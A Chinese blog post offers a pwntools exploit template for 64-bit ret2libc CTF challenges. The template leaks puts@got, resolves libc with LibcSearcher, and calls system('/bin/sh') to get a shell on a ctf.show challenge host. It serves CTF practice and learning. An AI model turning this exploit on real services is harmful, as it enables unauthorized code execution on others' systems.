---
title: "64位ret2libc-LibcSearcher-template"
published: 2026-05-12T21:52:00+08:00
description: "记录一个 64 位 ret2libc 配合 LibcSearcher 的利用模板。"
image: ""
tags: ["模板", "Pwn", "ret2libc", "LibcSearcher"]
category: "模板"
categoryPath: ["模板"]
series: ""
draft: false
lang: "zh_CN"
---

附件：[`exp.py`](/attachments/模板/64位ret2libc-LibcSearcher-template/exp.py)

这个模板基于常见的 64 位 `ret2libc` 两段式打法：先通过 `pop rdi; ret` 泄露 `puts@got`，交给 `LibcSearcher` 反推 libc 基址，再调用 `system("/bin/sh")`。

```python
'''
- 本地正常:python3 exp.py
- 远程正常:python3 exp.py REMOTE
'''
from pwn import *
from LibcSearcher import *
context(os="linux", terminal=["cmd.exe", "/c", "start"])

binary_path = "./pwn"
host = "pwn.challenge.ctf.show"#网址
port = 28117#端口

elf = ELF(binary_path, checksec=False)
context.binary = elf

if elf.bits == 64:
    context.arch = "amd64"
    gdbscript = """
    b *main
    c
    """
else:
    context.arch = "i386"
    gdbscript = """
    b *main
    c
    """


context.log_level = "debug"


if args.REMOTE:
    io = remote(host, port)
else:
    io = process(binary_path)

def p():
    pause()

#todo
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main = elf.sym['main']#0x804863E
offset = 0x70 + 8
ret=0x4004fe
rdi=0x400803
payload = flat([cyclic(offset),rdi,puts_got,puts_plt,main])
io.recv()
io.sendline(payload)

puts_real = u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
libc=LibcSearcher('puts',puts_real)
base=puts_real-libc.dump('puts')
system = base + libc.dump('system')
bin_sh = base + libc.dump('str_bin_sh')
payload = cyclic(offset) + p64(ret) + p64(rdi) + p64(bin_sh) + p64(system)
io.sendline(payload)

io.interactive()
```
